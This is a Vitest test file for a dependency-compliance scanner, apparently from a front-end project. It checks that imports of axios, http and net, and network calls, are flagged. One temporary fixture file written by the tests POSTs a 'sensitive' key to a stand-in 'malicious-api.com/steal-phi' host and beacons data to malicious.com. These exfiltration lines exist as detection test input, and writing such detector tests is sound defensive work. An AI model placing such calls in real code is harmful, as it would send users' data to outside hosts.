import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import fs from 'fs';
import path from 'path';
import {
  auditPackageJson,
  scanFileForCompliance
} from '../scripts/dependency_compliance.js';

describe('Dependency Compliance Guardrail', () => {
  const tempViolatingFile = path.resolve('src/temp-compliance-violating.ts');
  const tempCleanFile = path.resolve('src/temp-compliance-clean.ts');
  const tempDynamicViolatingFile = path.resolve('src/temp-dynamic-violating.ts');
  const tempDynamicCleanFile = path.resolve('src/temp-dynamic-clean.ts');
  const tempOutsideSrcViolatingFile = path.resolve('public/temp-outside-src-violating.ts');
  const tempCommentedFile = path.resolve('src/temp-commented.ts');

  beforeAll(() => {
    // Write a temporary file that contains forbidden imports and calls
    fs.writeFileSync(
      tempViolatingFile,
      `
      import axios from 'axios';
      import http from 'http';
      
      export function triggerNetwork() {
        fetch('https://malicious-api.com/steal-phi', {
          method: 'POST',
          body: JSON.stringify({ phKey: 'sensitive' })
        });
        
        const socket = new WebSocket('wss://malicious.com');
        const xhr = new XMLHttpRequest();
        navigator.sendBeacon('https://malicious.com/log');
      }
      `,
      'utf8'
    );

    // Write a clean temporary file
    fs.writeFileSync(
      tempCleanFile,
      `
      import { getContrastRatio } from '../src/utils/colorUtils';
      export function generateColors() {
        return getContrastRatio('#000000', '#ffffff');
      }
      `,
      'utf8'
    );

    // Write a file with dynamic forbidden imports using string literal, template literal, and string concatenation
    fs.writeFileSync(
      tempDynamicViolatingFile,
      `
      export async function loadModules() {
        const axios = await import('axios');
        const http = await import(\`http\`);
        const net = await import('n' + 'et');
      }
      `,
      'utf8'
    );

    // Write a file with clean dynamic imports
    fs.writeFileSync(
      tempDynamicCleanFile,
      `
      export async function loadLocalModule() {
        const mod = await import('./localModule.js');
        return mod;
      }
      `,
      'utf8'
    );

    // Write a non-src/ workspace file with compliance violations
    fs.writeFileSync(
      tempOutsideSrcViolatingFile,
      `
      import axios from 'axios';
      export function clientSetup() {
        fetch('https://example.com/telemetry');
      }
      `,
      'utf8'
    );

    // Write a file with commented out violations (should not flag)
    fs.writeFileSync(
      tempCommentedFile,
      `
      // import axios from 'axios';
      // fetch('https://example.com/telemetry');
      /* const http = require('http'); */
      `,
      'utf8'
    );
  });

  afterAll(() => {
    [
      tempViolatingFile,
      tempCleanFile,
      tempDynamicViolatingFile,
      tempDynamicCleanFile,
      tempOutsideSrcViolatingFile,
      tempCommentedFile
    ].forEach(f => {
      if (fs.existsSync(f)) fs.unlinkSync(f);
    });
  });

  describe('auditPackageJson', () => {
    it('should detect unauthorized production dependencies', () => {
      // Temporarily write a package.json with an unauthorized dependency
      const originalPath = path.resolve('package.json');
      const originalContent = fs.readFileSync(originalPath, 'utf8');
      const parsed = JSON.parse(originalContent);
      
      parsed.dependencies['axios'] = '^1.0.0';
      const tempPath = path.resolve('package.json.temp');
      fs.writeFileSync(tempPath, JSON.stringify(parsed, null, 2), 'utf8');

      try {
        // Swap package.json
        fs.renameSync(originalPath, path.resolve('package.json.original'));
        fs.renameSync(tempPath, originalPath);

        const violations = auditPackageJson();
        expect(violations.length).toBeGreaterThan(0);
        expect(violations[0]).toContain("axios");
      } finally {
        // Restore original package.json
        if (fs.existsSync(path.resolve('package.json.original'))) {
          if (fs.existsSync(originalPath)) fs.unlinkSync(originalPath);
          fs.renameSync(path.resolve('package.json.original'), originalPath);
        }
        if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);
      }
    });

    it('should pass if all dependencies are whitelisted', () => {
      const violations = auditPackageJson();
      expect(violations.length).toBe(0);
    });
  });

  describe('scanFileForCompliance', () => {
    it('should catch forbidden imports and unauthorized network requests', () => {
      const violations = scanFileForCompliance(tempViolatingFile);
      expect(violations.length).toBeGreaterThan(0);

      const types = violations.map(v => v.type);
      expect(types).toContain('Forbidden Network/Server-Side Import');
      expect(types).toContain('Unauthorized Network Call');

      const messages = violations.map(v => v.message);
      expect(messages.some(m => m.includes("axios"))).toBe(true);
      expect(messages.some(m => m.includes("http"))).toBe(true);
      expect(messages.some(m => m.includes("fetch"))).toBe(true);
      expect(messages.some(m => m.includes("WebSocket"))).toBe(true);
      expect(messages.some(m => m.includes("XMLHttpRequest"))).toBe(true);
      expect(messages.some(m => m.includes("sendBeacon"))).toBe(true);
    });

    it('should flag forbidden dynamic import(...) expressions', () => {
      const violations = scanFileForCompliance(tempDynamicViolatingFile);
      expect(violations.length).toBe(3);

      const messages = violations.map(v => v.message);
      expect(messages.some(m => m.includes("axios"))).toBe(true);
      expect(messages.some(m => m.includes("http"))).toBe(true);
      expect(messages.some(m => m.includes("net"))).toBe(true);
    });

    it('should allow compliant clean dynamic imports', () => {
      const violations = scanFileForCompliance(tempDynamicCleanFile);
      expect(violations.length).toBe(0);
    });

    it('should audit non-src/ workspace files and flag violations', () => {
      const violations = scanFileForCompliance(tempOutsideSrcViolatingFile);
      expect(violations.length).toBe(2);

      const types = violations.map(v => v.type);
      expect(types).toContain('Forbidden Network/Server-Side Import');
      expect(types).toContain('Unauthorized Network Call');
    });

    it('should ignore commented out imports and network calls', () => {
      const violations = scanFileForCompliance(tempCommentedFile);
      expect(violations.length).toBe(0);
    });

    it('should not flag compliant clean files', () => {
      const violations = scanFileForCompliance(tempCleanFile);
      expect(violations.length).toBe(0);
    });

    it('should ignore whitelisted files (like svgExport.ts) even if they use fetch', () => {
      // svgExport.ts is a real whitelisted file that calls fetch() for logo images it then sanitizes;
      // it should not return any "Unauthorized Network Call" violations.
      const tempWhitelistedFile = path.resolve('src/packages/qr-export/lib/svgExport.ts');
      const violations = scanFileForCompliance(tempWhitelistedFile);
      
      const unauthorizedCalls = violations.filter(v => v.type === 'Unauthorized Network Call');
      expect(unauthorizedCalls.length).toBe(0);
    });
  });
});
